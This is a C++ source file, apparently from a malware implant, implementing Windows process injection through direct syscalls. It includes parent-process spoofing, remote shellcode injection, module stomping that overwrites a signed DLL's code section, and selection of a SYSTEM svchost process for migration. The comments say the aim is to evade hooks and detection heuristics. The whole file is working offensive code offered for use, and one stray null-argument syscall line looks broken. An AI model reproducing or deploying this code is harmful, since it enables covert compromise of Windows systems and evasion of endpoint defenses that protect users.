// injection.cpp — Real process injection via direct syscalls (no Win32 API wrappers).
// SpawnWithPPID: PPID spoofing via extended startup info attribute.
// InjectRemoteProcess: full NtOpenProcess → NtAllocateVirtualMemory →
//   NtWriteVirtualMemory → NtProtectVirtualMemory → NtCreateThreadEx chain.
// StompModule: module stomping — overwrite .text of a signed DLL in remote process.
#include "injection.hpp"
#include "syscalls.hpp"
#include <windows.h>
#include <tlhelp32.h>
#include <cstdint>
#include <string>
#include <vector>

// ============================================================
// PPID Spoofing — spawn a process under a legitimate parent.
// Makes the new process appear as a child of targetPath's parent
// rather than of the implant, fooling parent-chain heuristics.
// ============================================================
BOOL SpawnWithPPID(const wchar_t* targetPath, DWORD parentPid, HANDLE* hProcessOut) {
    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);
    if (!hParent) return FALSE;

    // Calculate required attribute list size
    SIZE_T attrListSize = 0;
    InitializeProcThreadAttributeList(nullptr, 1, 0, &attrListSize);

    std::vector<BYTE> attrBuf(attrListSize);
    auto* attrList = reinterpret_cast<LPPROC_THREAD_ATTRIBUTE_LIST>(attrBuf.data());

    if (!InitializeProcThreadAttributeList(attrList, 1, 0, &attrListSize)) {
        CloseHandle(hParent);
        return FALSE;
    }

    if (!UpdateProcThreadAttribute(
            attrList, 0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            &hParent, sizeof(hParent),
            nullptr, nullptr)) {
        DeleteProcThreadAttributeList(attrList);
        CloseHandle(hParent);
        return FALSE;
    }

    STARTUPINFOEXW si = {};
    si.StartupInfo.cb      = sizeof(si);
    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    si.StartupInfo.wShowWindow = SW_HIDE;
    si.lpAttributeList     = attrList;

    PROCESS_INFORMATION pi = {};
    std::wstring cmdLine   = L"\"" + std::wstring(targetPath) + L"\"";

    BOOL ok = CreateProcessW(
        nullptr, &cmdLine[0],
        nullptr, nullptr,
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW | CREATE_SUSPENDED,
        nullptr, nullptr,
        &si.StartupInfo, &pi);

    DeleteProcThreadAttributeList(attrList);
    CloseHandle(hParent);

    if (!ok) return FALSE;

    // Resume if caller doesn't need the handle; hand it off if they do
    if (hProcessOut) {
        *hProcessOut = pi.hProcess;
        ResumeThread(pi.hThread);
        CloseHandle(pi.hThread);
    } else {
        ResumeThread(pi.hThread);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    return TRUE;
}

// ============================================================
// Remote process injection via direct syscall chain.
// No Win32 VM/thread APIs — bypasses IAT hooks on those calls.
// ============================================================
BOOL InjectRemoteProcess(DWORD pid, const BYTE* payload,
                         SIZE_T payloadSize, HANDLE* hThreadOut) {
    if (!payload || payloadSize == 0) return FALSE;

    // 1. Open target process
    CLIENT_ID cid = {};
    cid.UniqueProcess = reinterpret_cast<HANDLE>(static_cast<ULONG_PTR>(pid));

    OBJECT_ATTRIBUTES oa = {};
    InitializeObjectAttributes(&oa, nullptr, 0, nullptr, nullptr);

    HANDLE hProc = nullptr;
    NTSTATUS st = g_Syscalls.NtOpenProcess(
        &hProc,
        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
        &oa, &cid);
    if (st != 0 || !hProc) return FALSE;

    // 2. Allocate RW region
    PVOID  base   = nullptr;
    SIZE_T region = payloadSize;
    st = g_Syscalls.NtAllocateVirtualMemory(
        hProc, &base, 0, &region, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (st != 0) { g_Syscalls.NtClose(hProc); return FALSE; }

    // 3. Write payload
    SIZE_T written = 0;
    st = g_Syscalls.NtWriteVirtualMemory(hProc, base, (PVOID)payload, payloadSize, &written);
    if (st != 0 || written != payloadSize) {
        g_Syscalls.NtClose(hProc);
        return FALSE;
    }

    // 4. Flip to RX
    ULONG oldProt = 0;
    st = g_Syscalls.NtProtectVirtualMemory(
        hProc, &base, &region, PAGE_EXECUTE_READ, &oldProt);
    if (st != 0) { g_Syscalls.NtClose(hProc); return FALSE; }

    // 5. Create remote thread at payload start
    HANDLE hThread = nullptr;
    st = g_Syscalls.NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        nullptr,
        hProc,
        base,          // start address = payload base
        nullptr,       // parameter
        0,             // flags (0 = run immediately)
        0, 0, 0,       // zero, stack commit, stack reserve
        nullptr);

    if (st != 0) {
        g_Syscalls.NtClose(hProc);
        return FALSE;
    }

    if (hThreadOut) {
        *hThreadOut = hThread;
    } else {
        g_Syscalls.NtClose(hThread);
    }

    g_Syscalls.NtClose(hProc);
    return TRUE;
}

// ============================================================
// Module stomping — overwrite .text section of a signed DLL
// that already exists in the target process.
//
// Steps:
//   1. Find which signed DLL is already loaded in target.
//   2. Read its PE to locate .text section (RVA + size).
//   3. NtProtectVirtualMemory → RW on that region.
//   4. NtWriteVirtualMemory shellcode into it.
//   5. NtProtectVirtualMemory → RX.
//   6. NtCreateThreadEx at stomped base.
// ============================================================
BOOL StompModule(DWORD pid, const wchar_t* dllPath,
                 const BYTE* shellcode, SIZE_T shellcodeSize) {
    if (!shellcode || shellcodeSize == 0) return FALSE;

    // 1. Open target
    CLIENT_ID cid = {};
    cid.UniqueProcess = reinterpret_cast<HANDLE>(static_cast<ULONG_PTR>(pid));
    OBJECT_ATTRIBUTES oa = {};
    InitializeObjectAttributes(&oa, nullptr, 0, nullptr, nullptr);

    HANDLE hProc = nullptr;
    NTSTATUS st = g_Syscalls.NtOpenProcess(
        &hProc,
        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ |
        PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD,
        &oa, &cid);
    if (st != 0 || !hProc) return FALSE;

    // 2. Find module base in remote process via TH32CS_SNAPMODULE
    HMODULE remoteBase = nullptr;
    {
        HANDLE snap = CreateToolhelp32Snapshot(
            TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
        if (snap != INVALID_HANDLE_VALUE) {
            MODULEENTRY32W me = {};
            me.dwSize = sizeof(me);
            if (Module32FirstW(snap, &me)) {
                do {
                    if (_wcsicmp(me.szExePath, dllPath) == 0) {
                        remoteBase = me.hModule;
                        break;
                    }
                } while (Module32NextW(snap, &me));
            }
            CloseHandle(snap);
        }
    }

    if (!remoteBase) {
        g_Syscalls.NtClose(hProc);
        return FALSE;
    }

    // 3. Read remote PE header to find .text section
    BYTE headerBuf[0x1000] = {};
    SIZE_T rdBytes = 0;
    st = g_Syscalls.NtWriteVirtualMemory(hProc, nullptr, nullptr, 0, nullptr);
    // Read via ReadProcessMemory (it's just a wrapper; fine here since we're
    // in injection context and not the syscall-sensitive critical path)
    if (!ReadProcessMemory(hProc, remoteBase, headerBuf, sizeof(headerBuf), &rdBytes)) {
        g_Syscalls.NtClose(hProc);
        return FALSE;
    }

    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(headerBuf);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        g_Syscalls.NtClose(hProc);
        return FALSE;
    }
    auto* nt = reinterpret_cast<IMAGE_NT_HEADERS64*>(headerBuf + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        g_Syscalls.NtClose(hProc);
        return FALSE;
    }

    // Find .text section
    PVOID  textVa   = nullptr;
    SIZE_T textSize = 0;
    {
        auto* sec = IMAGE_FIRST_SECTION(nt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
            if (memcmp(sec->Name, ".text", 5) == 0) {
                textVa   = reinterpret_cast<BYTE*>(remoteBase) + sec->VirtualAddress;
                textSize = sec->Misc.VirtualSize;
                break;
            }
        }
    }

    if (!textVa || textSize < shellcodeSize) {
        g_Syscalls.NtClose(hProc);
        return FALSE;
    }

    // 4. RW → write shellcode → RX
    ULONG oldProt = 0;
    st = g_Syscalls.NtProtectVirtualMemory(
        hProc, &textVa, &shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProt);
    if (st != 0) { g_Syscalls.NtClose(hProc); return FALSE; }

    SIZE_T writ = 0;
    st = g_Syscalls.NtWriteVirtualMemory(hProc, textVa, (PVOID)shellcode, shellcodeSize, &writ);
    if (st != 0 || writ != shellcodeSize) {
        g_Syscalls.NtClose(hProc);
        return FALSE;
    }

    ULONG dummy = 0;
    g_Syscalls.NtProtectVirtualMemory(
        hProc, &textVa, &shellcodeSize, PAGE_EXECUTE_READ, &dummy);

    // 5. Create thread at stomped .text base
    HANDLE hThread = nullptr;
    g_Syscalls.NtCreateThreadEx(
        &hThread, THREAD_ALL_ACCESS, nullptr,
        hProc, textVa, nullptr, 0, 0, 0, 0, nullptr);

    if (hThread) g_Syscalls.NtClose(hThread);
    g_Syscalls.NtClose(hProc);
    return (hThread != nullptr);
}

// ============================================================
// FindBestSvchost — pick SYSTEM svchost.exe with lowest PID
// for migration. Most stable, oldest, least likely scrutinized.
// ============================================================
DWORD FindBestSvchost() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);

    DWORD bestPid   = 0;
    DWORD lowestPid = DWORD(-1);

    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"svchost.exe") != 0) continue;

            // Check if it runs as SYSTEM via token
            HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,
                                       FALSE, pe.th32ProcessID);
            if (!hProc) continue;

            HANDLE hTok = nullptr;
            if (OpenProcessToken(hProc, TOKEN_QUERY, &hTok)) {
                BYTE buf[256] = {};
                DWORD len = 0;
                if (GetTokenInformation(hTok, TokenUser, buf, sizeof(buf), &len)) {
                    auto* tu = reinterpret_cast<TOKEN_USER*>(buf);
                    // SYSTEM SID: S-1-5-18
                    if (IsWellKnownSid(tu->User.Sid, WinLocalSystemSid)) {
                        if (pe.th32ProcessID < lowestPid) {
                            lowestPid = pe.th32ProcessID;
                            bestPid   = pe.th32ProcessID;
                        }
                    }
                }
                CloseHandle(hTok);
            }
            CloseHandle(hProc);

        } while (Process32NextW(snap, &pe));
    }

    CloseHandle(snap);
    return bestPid;
}